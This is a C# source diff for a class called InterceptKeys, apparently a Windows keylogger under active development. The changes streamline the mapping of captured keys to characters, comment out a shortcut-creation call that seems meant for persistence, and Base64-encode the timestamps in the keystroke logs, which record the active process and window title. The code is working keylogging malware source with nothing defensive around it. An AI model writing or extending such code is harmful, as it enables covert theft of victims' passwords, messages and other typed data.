@@ -44,6 +44,7 @@ class InterceptKeys
         }
 
         // jak user to CreateShortcut()
+        //CreateShortcut();
 
         var handle = GetConsoleWindow();
 
@@ -95,73 +96,36 @@ class InterceptKeys
     private static string CheckSymbols(Keys key)
     {
         bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
-        if (shiftKey)
+        switch (key)
         {
-            switch (key)
-            {
-                case Keys.Left: return "|LEFT|";
-                case Keys.Up: return "|UP|";
-                case Keys.Right: return "|RIGHT|";
-                case Keys.Down: return "|DOWN|";
-                case Keys.Return: return "|Return|";
-                case Keys.D1: return "!";
-                case Keys.D2: return "@";
-                case Keys.D3: return "#";
-                case Keys.D4: return "$";
-                case Keys.D5: return "%";
-                case Keys.D6: return "^";
-                case Keys.D7: return "&";
-                case Keys.D8: return "*";
-                case Keys.D9: return "(";
-                case Keys.D0: return ")";
-                case Keys.Oemtilde: return "~";
-                case Keys.OemMinus: return "_";
-                case Keys.Oemplus: return "+";
-                case Keys.OemOpenBrackets: return "{";
-                case Keys.OemCloseBrackets: return "}";
-                case Keys.OemSemicolon: return ":";
-                case Keys.OemQuotes: return "\"";
-                case Keys.OemPipe: return "|";
-                case Keys.Oemcomma: return "<";
-                case Keys.OemPeriod: return ">";
-                case Keys.OemQuestion: return "?";
-                case Keys.Back: return "|BACK|"; // backspace
-                case Keys.Space: return " ";
-            }
-        }
-        else
-        {
-            switch (key)
-            {
-                case Keys.Left: return "|LEFT|";
-                case Keys.Up: return "|UP|";
-                case Keys.Right: return "|RIGHT|";
-                case Keys.Down: return "|DOWN|";
-                case Keys.Return: return "|ENTER|";
-                case Keys.D1: return "1";
-                case Keys.D2: return "2";
-                case Keys.D3: return "3";
-                case Keys.D4: return "4";
-                case Keys.D5: return "5";
-                case Keys.D6: return "6";
-                case Keys.D7: return "7";
-                case Keys.D8: return "8";
-                case Keys.D9: return "9";
-                case Keys.D0: return "0";
-                case Keys.Oemtilde: return "`";
-                case Keys.OemMinus: return "-";
-                case Keys.Oemplus: return "=";
-                case Keys.OemOpenBrackets: return "[";
-                case Keys.OemCloseBrackets: return "]";
-                case Keys.OemSemicolon: return ";";
-                case Keys.OemQuotes: return "'";
-                case Keys.OemPipe: return "\\";
-                case Keys.Oemcomma: return ",";
-                case Keys.OemPeriod: return ".";
-                case Keys.OemQuestion: return "/";
-                case Keys.Back: return "|BACK|"; // backspace
-                case Keys.Space: return " ";
-            }
+            case Keys.Left: return "|LEFT|";
+            case Keys.Up: return "|UP|";
+            case Keys.Right: return "|RIGHT|";
+            case Keys.Down: return "|DOWN|";
+            case Keys.Return: return "|Return|";
+            case Keys.D1: return shiftKey ? "!" : "1";
+            case Keys.D2: return shiftKey ? "@" : "2";
+            case Keys.D3: return shiftKey ? "#" : "3";
+            case Keys.D4: return shiftKey ? "$" : "4";
+            case Keys.D5: return shiftKey ? "%" : "5";
+            case Keys.D6: return shiftKey ? "^" : "6";
+            case Keys.D7: return shiftKey ? "&" : "7";
+            case Keys.D8: return shiftKey ? "*" : "8";
+            case Keys.D9: return shiftKey ? "(" : "9";
+            case Keys.D0: return shiftKey ? ")" : "0";
+            case Keys.Oemtilde: return shiftKey ? "~" : "`";
+            case Keys.OemMinus: return shiftKey ? "_" : "-";
+            case Keys.Oemplus: return shiftKey ? "+" : "=";
+            case Keys.OemOpenBrackets: return shiftKey ? "{" : "[";
+            case Keys.OemCloseBrackets: return shiftKey ? "}" : "]";
+            case Keys.OemSemicolon: return shiftKey ? ":" : ";";
+            case Keys.OemQuotes: return shiftKey ? "\"" : "'";
+            case Keys.OemPipe: return shiftKey ? "|" : "\\";
+            case Keys.Oemcomma: return shiftKey ? "<" : ",";
+            case Keys.OemPeriod: return shiftKey ? ">" : ".";
+            case Keys.OemQuestion: return shiftKey ? "?" : "/";
+            case Keys.Back: return "|BACK|"; // backspace
+            case Keys.Space: return " ";
         }
 
         return "";
@@ -170,7 +134,7 @@ class InterceptKeys
     private static string Parse(int key, bool alt)
     {
         bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
-    bool ctrlKey = (Control.ModifierKeys & Keys.Control) != 0;
+        bool ctrlKey = (Control.ModifierKeys & Keys.Control) != 0;
 
         char keyChar = (char)key;
 
@@ -263,11 +227,11 @@ class InterceptKeys
 
             sw.WriteLine();
             sw.WriteLine();
-            sw.WriteLine($"[Time: {currentDateAndTime}]");
+            sw.WriteLine($"[Time: {EncodeDateTime(currentDateAndTime)}]");
             sw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
             rawSw.WriteLine();
             rawSw.WriteLine();
-            rawSw.WriteLine($"[Time: {currentDateAndTime}]");
+            rawSw.WriteLine($"[Time: {EncodeDateTime(currentDateAndTime)}]");
             rawSw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
 
             sw.Close();
@@ -275,6 +239,17 @@ class InterceptKeys
 
             previousForegroundWindowHandle = currentForegroundWindowHandle;
         }
+    }
+
+    static string EncodeDateTime(DateTime dateTime)
+    {
+        return Convert.ToBase64String(BitConverter.GetBytes(dateTime.Ticks));
+    }
+
+    static DateTime DecodeDateTime(string encodedDateTime)
+    {
+        long ticks = BitConverter.ToInt64(Convert.FromBase64String(encodedDateTime), 0);
+        return new DateTime(ticks);
     }
 
     private static Process GetProcessFromWindowHandle(IntPtr windowHandle)
